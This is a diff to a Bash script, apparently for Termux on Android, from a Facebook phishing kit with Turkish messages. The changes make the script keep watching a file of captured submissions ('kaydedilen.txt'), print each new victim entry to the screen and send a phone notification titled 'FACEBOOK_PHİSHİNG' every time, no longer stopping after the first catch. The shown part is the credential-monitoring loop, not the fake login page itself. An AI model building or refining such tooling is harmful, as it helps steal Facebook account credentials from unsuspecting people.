@@ -93,6 +93,8 @@ dongu() {
 while :
 do
 	if [[ -a kaydedilen.txt ]];then
+		clear
+		termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
 		echo
 		echo
 		echo
@@ -100,18 +102,54 @@ do
 		echo
 		echo
 		echo
-		termux-notification -t FACEBOOK_PHİSİNG -c "[✓] BİLGİ GİRİLDİ"
+		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
+		echo
+		echo
+		echo
+		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
+		echo
+		echo
+		echo
+		cat kaydedilen.txt > .sayi.txt
+		while :
+		do
+			kontrol1=$(cat .sayi.txt |wc -l)
+			kontrol2=$(cat kaydedilen.txt |wc -l)
+			if [[ $kontrol1 != $kontrol2 ]];then
+				cat kaydedilen.txt > .sayi.txt
+				clear
+				termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
+				echo
+				echo
+				echo
+				printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+				echo
+				echo
+				echo
+				printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
+				echo
+				echo
+				echo
+				printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
+				echo
+				echo
+				echo
+			fi
+		done
 		exit
 	fi
 done
 }
 dongu2() {
 cat kaydedilen.txt > .sayi.txt
-kontrol2=$(cat .sayi.txt |wc -l)
 while :
 do
-	kontrol=$(cat kaydedilen.txt |wc -l)
-	if [[ $kontrol != $kontrol2 ]];then
+	kontrol1=$(cat .sayi.txt |wc -l)
+	kontrol2=$(cat kaydedilen.txt |wc -l)
+	if [[ $kontrol1 != $kontrol2 ]];then
+		cat kaydedilen.txt > .sayi.txt
+		clear
+		termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
 		echo
 		echo
 		echo
@@ -119,10 +157,17 @@ do
 		echo
 		echo
 		echo
-		termux-notification -t FACEBOOK_PHİSİNG -c "[✓] BİLGİ GİRİLDİ"
-		exit
+		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
+		echo
+		echo
+		echo
+		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
+		echo
+		echo
+		echo
 	fi
 done
+exit
 }
 bulunan() {
 if [[ -a kaydedilen.txt ]];then
@@ -193,6 +238,10 @@ if [[ -a kaydedilen.txt ]];then
 		echo
 		echo
 		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
+		echo
+		echo
+		echo
+		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
 		echo
 		echo
 		echo
